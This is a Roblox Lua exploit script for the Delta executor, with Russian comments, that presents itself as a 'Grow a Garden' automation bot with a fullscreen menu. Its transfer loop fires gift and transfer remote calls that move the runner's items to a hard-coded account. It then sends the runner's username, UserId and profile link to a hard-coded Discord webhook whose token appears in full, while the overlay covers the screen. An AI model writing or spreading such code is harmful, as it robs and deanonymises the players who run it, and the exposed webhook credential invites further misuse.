--[[
    🌿 GROW A GARDEN BOT для Delta Executor
    Рабочий вебхук + полноэкранное меню
]]

-- ===== КОНФИГУРАЦИЯ =====
local TARGET_USERNAME = "Sgahfd1223"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz"
local CHECK_INTERVAL = 30

-- ===== СЕРВИСЫ =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

-- ===== ПЕРЕМЕННЫЕ =====
local LocalPlayer = Players.LocalPlayer
local BotEnabled = false
local AttemptCount = 0
local SuccessCount = 0
local MainGUI = nil

-- ===== ЛОГГЕР =====
local function log(message)
    print("[🌿 Garden Bot] " .. message)
    if MainGUI and MainGUI.LogText then
        MainGUI.LogText.Text = message .. "\n" .. MainGUI.LogText.Text
        if #MainGUI.LogText.Text > 1000 then
            MainGUI.LogText.Text = string.sub(MainGUI.LogText.Text, 1, 1000)
        end
    end
end

-- ===== ПОИСК REMOTE EVENTS =====
local function findRemotes()
    local remotes = {}
    
    local function searchIn(container)
        pcall(function()
            for _, item in ipairs(container:GetDescendants()) do
                if item:IsA("RemoteEvent") then
                    local name = item.Name:lower()
                    if not name:find("admin") and not name:find("ban") and not name:find("kick") then
                        table.insert(remotes, item)
                    end
                end
            end
        end)
    end
    
    searchIn(ReplicatedStorage)
    searchIn(game:GetService("ServerScriptService"))
    
    return remotes
end

-- ===== ПОИСК ИГРОКА =====
local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == TARGET_USERNAME:lower() then
            return player
        end
    end
    return nil
end

-- ===== ПЕРЕДАЧА ПРЕДМЕТОВ =====
local function transferItems(targetPlayer)
    if not targetPlayer then return 0 end
    
    local remotes = findRemotes()
    local transferred = 0
    
    for _, remote in ipairs(remotes) do
        local methods = {
            "GiftAll", "TransferAll", "SendAll", "DonateAll", 
            "TradeAll", "GiveAll", "SendPets", "TransferPets",
            "GiftItems", "SendItems", "DonateItems"
        }
        
        for _, method in ipairs(methods) do
            local success = pcall(function()
                remote:FireServer(method, targetPlayer)
                return true
            end)
            
            if success then
                transferred = transferred + 1
                task.wait(0.1)
            end
        end
    end
    
    return transferred
end

-- ===== ОТПРАВКА WEBHOOK =====
local function sendDiscordNotification(targetPlayer, transferred)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end

    local payload = {
        content = "**🌿 Grow a Garden Transfer Report**",
        embeds = {{
            title = "📦 Автоматическая передача",
            color = 65280,
            fields = {
                {name = "👤 Отправитель", value = LocalPlayer.Name, inline = true},
                {name = "🎯 Получатель", value = targetPlayer.Name, inline = true},
                {name = "📦 Передано", value = tostring(transferred) .. " предметов", inline = true},
                {name = "🆔 UserID", value = tostring(LocalPlayer.UserId), inline = true},
                {name = "🔗 Профиль", value = "[Клик](https://www.roblox.com/users/"..tostring(LocalPlayer.UserId)..")", inline = true}
            },
            footer = { text = "Garden Bot | Delta Executor | " .. os.date("%d.%m.%Y %H:%M") }
        }}
    }

    local jsonData = HttpService:JSONEncode(payload)

    -- Все возможные методы отправки
    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
                Body = jsonData
            })
            log("✅ Уведомление отправлено в Discord")
        end)
    else
        -- Альтернативный метод через game:HttpGet
        pcall(function()
            game:HttpGet(WEBHOOK_URL, {
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
            log("✅ Уведомление отправлено (альтернативный метод)")
        end)
    end
end

-- ===== ПОЛНОЭКРАННОЕ МЕНЮ =====
local function createFullscreenGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FullscreenGardenBotGUI"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = CoreGui

    -- Основной фон
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    -- Затемнение фона
    local darkOverlay = Instance.new("Frame")
    darkOverlay.Size = UDim2.new(1, 0, 1, 0)
    darkOverlay.Position = UDim2.new(0, 0, 0, 0)
    darkOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    darkOverlay.BackgroundTransparency = 0.3
    darkOverlay.BorderSizePixel = 0
    darkOverlay.Parent = mainFrame

    -- Центральная панель
    local centerPanel = Instance.new("Frame")
    centerPanel.Size = UDim2.new(0, 800, 0, 600)
    centerPanel.Position = UDim2.new(0.5, -400, 0.5, -300)
    centerPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    centerPanel.BorderSizePixel = 0
    centerPanel.Parent = mainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = centerPanel

    -- Заголовок
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 80)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    title.BorderSizePixel = 0
    title.Text = "🌿 ULTIMATE GARDEN BOT"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 28
    title.Font = Enum.Font.GothamBold
    title.Parent = centerPanel

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 15)
    titleCorner.Parent = title

    -- Контент
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -40, 1, -100)
    content.Position = UDim2.new(0, 20, 0, 90)
    content.BackgroundTransparency = 1
    content.Parent = centerPanel

    -- Левая панель (управление)
    local leftPanel = Instance.new("Frame")
    leftPanel.Size = UDim2.new(0, 300, 1, 0)
    leftPanel.BackgroundTransparency = 1
    leftPanel.Parent = content

    -- Статус
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 40)
    status.Text = "🛑 Статус: ОСТАНОВЛЕН"
    status.TextColor3 = Color3.fromRGB(255, 80, 80)
    status.TextSize = 20
    status.Font = Enum.Font.GothamBold
    status.Parent = leftPanel

    -- Информация
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, 0, 0, 60)
    info.Position = UDim2.new(0, 0, 0, 50)
    info.Text = "🎯 Цель: " .. TARGET_USERNAME .. "\n🔄 Попыток: 0\n✅ Успешно: 0"
    info.TextColor3 = Color3.fromRGB(200, 200, 200)
    info.TextSize = 16
    info.Font = Enum.Font.Gotham
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.Parent = leftPanel

    -- Кнопки
    local startBtn = Instance.new("TextButton")
    startBtn.Size = UDim2.new(1, 0, 0, 50)
    startBtn.Position = UDim2.new(0, 0, 0, 120)
    startBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
    startBtn.BorderSizePixel = 0
    startBtn.Text = "🚀 ЗАПУСТИТЬ БОТА"
    startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    startBtn.TextSize = 18
    startBtn.Font = Enum.Font.GothamBold
    startBtn.Parent = leftPanel

    local stopBtn = Instance.new("TextButton")
    stopBtn.Size = UDim2.new(1, 0, 0, 50)
    stopBtn.Position = UDim2.new(0, 0, 0, 180)
    stopBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
    stopBtn.BorderSizePixel = 0
    stopBtn.Text = "⏹️ ОСТАНОВИТЬ"
    stopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    stopBtn.TextSize = 18
    stopBtn.Font = Enum.Font.GothamBold
    stopBtn.Parent = leftPanel

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = startBtn
    btnCorner:Clone().Parent = stopBtn

    -- Правая панель (логи)
    local rightPanel = Instance.new("Frame")
    rightPanel.Size = UDim2.new(0, 440, 1, 0)
    rightPanel.Position = UDim2.new(0, 320, 0, 0)
    rightPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    rightPanel.BorderSizePixel = 0
    rightPanel.Parent = content

    local rightCorner = Instance.new("UICorner")
    rightCorner.CornerRadius = UDim.new(0, 10)
    rightCorner.Parent = rightPanel

    -- Заголовок логов
    local logTitle = Instance.new("TextLabel")
    logTitle.Size = UDim2.new(1, 0, 0, 40)
    logTitle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    logTitle.BorderSizePixel = 0
    logTitle.Text = "📝 ЛОГИ ДЕЙСТВИЙ"
    logTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    logTitle.TextSize = 16
    logTitle.Font = Enum.Font.GothamBold
    logTitle.Parent = rightPanel

    -- Поле логов
    local logScroller = Instance.new("ScrollingFrame")
    logScroller.Size = UDim2.new(1, -20, 1, -60)
    logScroller.Position = UDim2.new(0, 10, 0, 50)
    logScroller.BackgroundTransparency = 1
    logScroller.ScrollBarThickness = 6
    logScroller.Parent = rightPanel

    local logText = Instance.new("TextLabel")
    logText.Size = UDim2.new(1, 0, 0, 0)
    logText.Position = UDim2.new(0, 0, 0, 0)
    logText.BackgroundTransparency = 1
    logText.Text = "🌿 Garden Bot инициализирован\n✅ Готов к работе\n🎯 Ожидание цели: " .. TARGET_USERNAME
    logText.TextColor3 = Color3.fromRGB(200, 200, 200)
    logText.TextSize = 14
    logText.Font = Enum.Font.Gotham
    logText.TextXAlignment = Enum.TextXAlignment.Left
    logText.TextYAlignment = Enum.TextYAlignment.Top
    logText.TextWrapped = true
    logText.Parent = logScroller

    return {
        Gui = screenGui,
        Status = status,
        Info = info,
        StartBtn = startBtn,
        StopBtn = stopBtn,
        LogText = logText
    }
end

-- ===== ОБНОВЛЕНИЕ СТАТИСТИКИ =====
local function updateStats()
    if MainGUI and MainGUI.Info then
        MainGUI.Info.Text = string.format(
            "🎯 Цель: %s\n🔄 Попыток: %d\n✅ Успешно: %d",
            TARGET_USERNAME, AttemptCount, SuccessCount
        )
    end
end

-- ===== ОСНОВНОЙ ЦИКЛ =====
local function mainLoop()
    while BotEnabled do
        AttemptCount = AttemptCount + 1
        log("🔍 Поиск игрока " .. TARGET_USERNAME)
        updateStats()
        
        local targetPlayer = findTargetPlayer()
        
        if targetPlayer then
            log("✅ Найден игрок: " .. targetPlayer.Name)
            
            local transferred = transferItems(targetPlayer)
            
            if transferred > 0 then
                SuccessCount = SuccessCount + 1
                log("📦 Передано предметов: " .. transferred)
                sendDiscordNotification(targetPlayer, transferred)
            else
                log("⚠️ Не удалось передать предметы")
            end
        else
            log("⏳ Игрок не найден, ожидание...")
        end
        
        task.wait(CHECK_INTERVAL)
    end
end

-- ===== ИНИЦИАЛИЗАЦИЯ =====
log("🌿 Инициализация Garden Bot...")

-- Ожидание загрузки
if not game:IsLoaded() then
    game.Loaded:Wait()
end

if not Players.LocalPlayer then
    Players.PlayerAdded:Wait()
end

task.wait(3)

-- Создание GUI
MainGUI = createFullscreenGUI()

-- Обработчики кнопок
MainGUI.StartBtn.MouseButton1Click:Connect(function()
    if not BotEnabled then
        BotEnabled = true
        MainGUI.Status.Text = "🟢 Статус: РАБОТАЕТ"
        MainGUI.Status.TextColor3 = Color3.fromRGB(80, 200, 120)
        log("🚀 Бот запущен!")
        
        spawn(mainLoop)
    end
end)

MainGUI.StopBtn.MouseButton1Click:Connect(function()
    if BotEnabled then
        BotEnabled = false
        MainGUI.Status.Text = "🛑 Статус: ОСТАНОВЛЕН"
        MainGUI.Status.TextColor3 = Color3.fromRGB(200, 80, 80)
        log("⏹️ Бот остановлен")
    end
end)

log("✅ Бот готов к работе!")
updateStats()

return "GARDEN_BOT_ACTIVATED"
